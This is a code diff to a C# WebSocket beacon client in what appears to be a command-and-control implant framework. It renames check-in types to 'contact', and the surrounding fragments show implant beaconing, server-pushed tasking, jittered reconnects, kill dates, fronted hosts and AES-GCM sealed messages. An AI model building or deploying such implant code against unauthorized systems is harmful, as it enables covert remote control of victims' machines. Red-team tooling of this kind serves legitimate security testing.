@@ -12,7 +12,7 @@ namespace Rod.Implant.Internal;
 // the web posture's interactive tier): the same live session the mTLS gRPC
 // stream runs, over a WebSocket on a web front -- server-push tasking the
 // moment it is queued, live channels for the streaming verbs -- with the
-// envelope check-in's own auth and frame grammar (extending/implants.md):
+// envelope contact's own auth and frame grammar (extending/implants.md):
 // every message is the sealed-or-plaintext framed-frames body the POST cycle
 // carries, so the per-artifact key authenticates and seals exactly as it
 // does there and the web transports still request no TLS client certificate.
@@ -24,9 +24,9 @@ namespace Rod.Implant.Internal;
 /// Builds the WebSocket stream client off the shared setup; the factory the
 /// generated transport selection names for stream-mode web builds.
 /// </summary>
-internal static class WsCheckIn
+internal static class WsContact
 {
-    public static ICheckInClient Create(CheckInSetup setup) => new WsBeacon(
+    public static IContactClient Create(ContactSetup setup) => new WsBeacon(
         setup.Egress,
         setup.Enrollment.ImplantId,
         setup.Enrollment.Leaf,
@@ -44,14 +44,14 @@ internal static class WsCheckIn
 }
 
 /// <summary>
-/// Runs the implant's check-in lifecycle over the WebSocket beacon: open the
+/// Runs the implant's contact lifecycle over the WebSocket beacon: open the
 /// socket, handshake (the first message), then hold the session -- read
 /// tasking and channel input, write results and channel output -- until the
 /// connection drops, the kill date passes, or the server refuses permanently.
 /// A dropped connection is a reconnect, not a termination: the session
 /// survives it server-side, so the next cycle re-handshakes and continues.
 /// </summary>
-internal sealed class WsBeacon : ICheckInClient
+internal sealed class WsBeacon : IContactClient
 {
     /// <summary>
     /// The WebSocket beacon route, the fixed path beside the envelope's
@@ -79,14 +79,14 @@ internal sealed class WsBeacon : ICheckInClient
     // dedup, staged/channel/inline shapes) over this client's per-run state.
     private readonly BeaconTasking _tasking;
 
-    // The per-artifact check-in seal, the envelope client's own: present only
-    // when the bake asked for sealed check-ins, and every message this client
+    // The per-artifact contact seal, the envelope client's own: present only
+    // when the bake asked for sealed contacts, and every message this client
     // exchanges then rides as AES-256-GCM ciphertext under it.
     private readonly (byte[] KeyId, byte[] Key)? _seal;
 
-    // The check-in counter, burned on every client message exactly as the
+    // The contact counter, burned on every client message exactly as the
     // envelope burns it on every POST attempt.
-    private long _checkInCounter;
+    private long _contactCounter;
 
     public WsBeacon(
         EgressEndpoints egress,
@@ -122,7 +122,7 @@ internal sealed class WsBeacon : ICheckInClient
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
         _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
-        _seal = transport is { SealsCheckIns: true }
+        _seal = transport is { SealsContacts: true }
             ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
             : null;
     }
@@ -141,11 +141,11 @@ internal sealed class WsBeacon : ICheckInClient
     /// handshake refusal. A dropped connection (transport failure, refused
     /// message) walks the egress entry and reconnects on the jittered cadence
     /// with the same exponential backoff the other clients apply. Returns
-    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current
+    /// <see cref="ContactExit.SwitchTransport"/> when the walk's current
     /// entry is not a web URL, so the coordinator hands the run to the gRPC
     /// stream client.
     /// </summary>
-    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -153,10 +153,10 @@ internal sealed class WsBeacon : ICheckInClient
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
             if (!BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
-                return CheckInExit.SwitchTransport;
+                return ContactExit.SwitchTransport;
 
             var cycle = BeaconCycleResult.Dropped;
             try
@@ -179,7 +179,7 @@ internal sealed class WsBeacon : ICheckInClient
             // Every non-OK handshake status is permanent for this artifact:
             // retrying would not change the answer.
             if (cycle == BeaconCycleResult.Terminal)
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
 
             if (cycle == BeaconCycleResult.Handshaken)
             {
@@ -198,14 +198,14 @@ internal sealed class WsBeacon : ICheckInClient
             try
             {
                 var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
-                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
+                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
         }
-        return CheckInExit.Terminate;
+        return ContactExit.Terminate;
     }
 
     // One connection: dial, handshake, then hold the session until the
@@ -499,9 +499,9 @@ internal sealed class WsBeacon : ICheckInClient
         if (_seal is { } seal)
         {
             var plaintext = new byte[8 + encoded.Length];
-            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
+            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_contactCounter);
             encoded.AsSpan().CopyTo(plaintext.AsSpan(8));
-            message = EnvelopeWire.SealCheckInBody(plaintext, seal.KeyId, seal.Key, "rod-checkin-v1");
+            message = EnvelopeWire.SealContactBody(plaintext, seal.KeyId, seal.Key, "rod-contact-v1");
             type = System.Net.WebSockets.WebSocketMessageType.Text;
         }
         else
@@ -535,7 +535,7 @@ internal sealed class WsBeacon : ICheckInClient
         var body = message.ToArray();
         if (_seal is { } open)
         {
-            var plaintext = EnvelopeWire.TryOpenCheckInBody(body, open.KeyId, open.Key, "rod-checkin-response-v1")
+            var plaintext = EnvelopeWire.TryOpenContactBody(body, open.KeyId, open.Key, "rod-contact-response-v1")
                 ?? throw new InvalidOperationException("beacon message did not verify under the baked key");
             return EnvelopeCodec.Parse(plaintext);
         }
